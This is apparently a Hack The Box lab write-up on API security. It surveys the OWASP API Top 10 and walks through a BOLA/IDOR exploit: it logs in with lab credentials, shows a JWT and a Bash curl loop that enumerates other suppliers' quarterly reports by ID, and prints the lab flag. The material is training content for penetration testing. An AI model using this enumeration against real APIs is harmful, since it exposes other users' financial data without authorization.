# API Attacks

This document outlines common techniques for identifying and exploiting **API related vulnerabilities**. It is intended as a practical, hands-on reference rather than a comprehensive theoretical guide.

---

# Table of Contents

- [API Attacks](#api-attacks)
  - [Overview](#overview)
  - [Broken Object Level Authorization (BOLA)](#broken-object-level-authorization-bola)


---

## Overview

Application Programming Interfaces (APIs) are a foundational component of modern software development. APIs act as an intermediary between applications, enabling communication and data exchange across different systems. At their core, APIs consist of well-defined rules and protocols that dictate how systems interact with one another.

There are several common API architectures, including **REST**, **SOAP**, **GraphQL**, and **gRPC**.

**Representational State Transfer (REST)** is the most widely adopted API architecture. It follows a **client–server model**, where clients request resources from a server using standard HTTP methods such as `GET`, `POST`, `PUT`, and `DELETE`. RESTful APIs are **stateless**, meaning each request contains all the information required for the server to process it. Responses are typically serialized in **JSON** or **XML** format.

**Simple Object Access Protocol (SOAP)** relies on XML-based messaging to facilitate communication between systems. SOAP APIs are highly standardized and provide extensive support for security, transactions, and error handling. However, they are generally more complex to implement and consume compared to RESTful APIs.

**GraphQL** offers a flexible and efficient approach to querying and modifying data. It allows clients to specify exactly which data they require, reducing both over-fetching and under-fetching. GraphQL operates through a single endpoint and uses a strongly typed query language to interact with backend data sources.

**gRPC** is a modern API architecture that uses **Protocol Buffers** for message serialization. It supports multiple programming languages and is commonly used in microservices and distributed systems due to its performance and efficiency.

While APIs are a critical enabler of modern applications, they also introduce a significant attack surface. The ten most critical API security risks include:

- Broken Object Level Authorization (BOLA)
    - The API allows authenticated users to access data they are not authorized to view.
- Broken Authentication
    - The authentication mechanisms can be bypassed or circumvented, enabling unauthorized access.
- Broken Object Property Level Authorization
    - The API exposes sensitive object properties or allows unauthorized manipulation of them.
- Unrestricted Resource Consumption
    - The API does not enforce limits on resource usage, enabling denial-of-service conditions.
- Broken Function Level Authorization
    - Unauthorized users are able to perform privileged or restricted operations.
- Unrestricted Access to Sensitive Business Flows
    - Sensitive workflows are exposed, potentially leading to financial or operational impact.
- Server Side Request Forgery (SSRF)
    - Insufficient validation allows attackers to coerce the server into making malicious internal requests.
- Security Misconfiguration
    - Improper configuration leads to vulnerabilities, including various injection flaws.
- Improper Inventory Management
    - API versions and endpoints are not properly tracked or secured.
- Unsafe Consumption of APIs
    - The API unsafely consumes third-party or internal APIs, propagating trust and security issues.

---

## Broken Object Level Authorization (BOLA)

Failing to verify that a user has ownership of, or permission to access, a specific resource through **object-level authorization mechanisms** can result in serious security vulnerabilities. This class of issue is known as **Broken Object Level Authorization (BOLA)** and is commonly referred to as **Insecure Direct Object Reference (IDOR)**.

The target application is vulnerable to [CWE-639: Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html). A brief description of this weakness is provided below:

```
The system's authorization functionality does not prevent one user from gaining access to another user's data or record by modifying the key value identifying the data.
```

The following credentials are provided:

```
htbpentester2@pentestercompany.com:HTBPentester2
```

Authentication is performed via the following endpoint, which returns a **JSON Web Token (JWT)** upon successful login:

```
/api/v1/authentication/suppliers/sign-in
```

The authentication request is sent as JSON:

```json
{
  "Email": "htbpentester2@pentestercompany.com",
  "Password": "HTBPentester2"
}
```

![Filtered output](images/bola.PNG)

The server responds with a valid JWT:

```json
{
  "jwt": "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjJAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiU3VwcGxpZXJDb21wYW5pZXNfR2V0WWVhcmx5UmVwb3J0QnlJRCIsIlN1cHBsaWVyc19HZXRRdWFydGVybHlSZXBvcnRCeUlEIl0sImV4cCI6MTc2Nzk3Mzk3NCwiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.-_UeCTrm-n3TcFnd3MQL7fWsXFcndOkwy9M3D0jXMA-bJ5nFscGGVdrljuhB-bZTGpzWW21Ur1nRZeJHy4stSw"
}
```

![Filtered output](images/bola2.PNG)

The JWT is supplied to the API by using the `Authorize` feature in the Swagger interface:

![Filtered output](images/bola3.PNG)

After entering the token, authorization succeeds:

![Filtered output](images/bola4.PNG)

Next, endpoints within the **Suppliers** group are reviewed. An endpoint named `/api/v1/suppliers/current-user` is identified. The `current-user` naming convention suggests that the endpoint relies on the JWT to determine the authenticated user context.

![Filtered output](images/bola5.PNG)

Invoking this endpoint returns details associated with the authenticated supplier, including the internal `id` and `companyID` values:

```json
{
  "supplier": {
    "id": "781391c3-c6e3-4f42-bea4-1e71b6d9b4e7",
    "companyID": "b75a7c76-e149-4ca7-9c55-d9fc4ffa87be",
    "name": "HTBPentester2",
    "email": "htbpentester2@pentestercompany.com",
    "phoneNumber": "+44 9999 999992"
  }
}
```

![Filtered output](images/bola6.PNG)

Further inspection of the **Supplier** endpoints reveals the following endpoint, which accepts a user-controlled integer identifier:

```
/api/v1/suppliers/quarterly-reports/{ID}
```

![Filtered output](images/bola7.PNG)

By modifying the `{ID}` parameter, it is possible to retrieve quarterly reports belonging to other suppliers. For example, requesting the report with an `id` value of `2` returns data associated with a different supplier:

```json
{
  "supplierQuarterlyReport": {
    "id": 2,
    "supplierID": "00ac3d74-6c7d-4ef0-bf15-00851bf353ba",
    "quarter": 3,
    "year": 2022,
    "amountSold": 608221,
    "commentsFromManager": "Remarkable dedication! I'm full of admiration for your efforts! Get ready for a custom-tailored reward!"
  }
}
```

![Filtered output](images/bola8.PNG)

This confirms the presence of a **BOLA/IDOR** vulnerability, as the API does not enforce ownership or authorization checks on the requested object.

The vulnerability can be abused at scale by iterating over sequential report identifiers. Using the `curl` command generated by the Swagger interface as a base, a simple Bash script is created to retrieve multiple reports:

```bash
#!/usr/bin/env bash

for ((i=1; i<= 20; i++)); do
    curl -s -w "\n" -X 'GET' \
    "http://83.136.249.164:34382/api/v1/suppliers/quarterly-reports/$i" \
    -H 'accept: application/json' \
    -H 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjJAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiU3VwcGxpZXJDb21wYW5pZXNfR2V0WWVhcmx5UmVwb3J0QnlJRCIsIlN1cHBsaWVyc19HZXRRdWFydGVybHlSZXBvcnRCeUlEIl0sImV4cCI6MTc2Nzk3Njk1OSwiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.YPtcMyEp9HscjlfjpFxMH01SVAcTXWmeySXl1n7hAvQGXdCCwQUqudSfwhxcjcC5KyQqDsU3menKCdRsc-IdzQ' | jq >> reports.txt
done
```

The script fetches the first 20 quarterly reports and stores them in `reports.txt`.

Searching the output file reveals the flag:

```bash
grep -i "htb" reports.txt
```

Flag:

```
HTB{e76651e1f516eb5d7260621c26754776}
```

![Filtered output](images/bola9.PNG)

This vulnerability allows **authenticated users to access sensitive financial and operational data belonging to other suppliers** by simply modifying a numeric identifier. The lack of object-level authorization checks enables large-scale data exposure and demonstrates a critical API security flaw.

---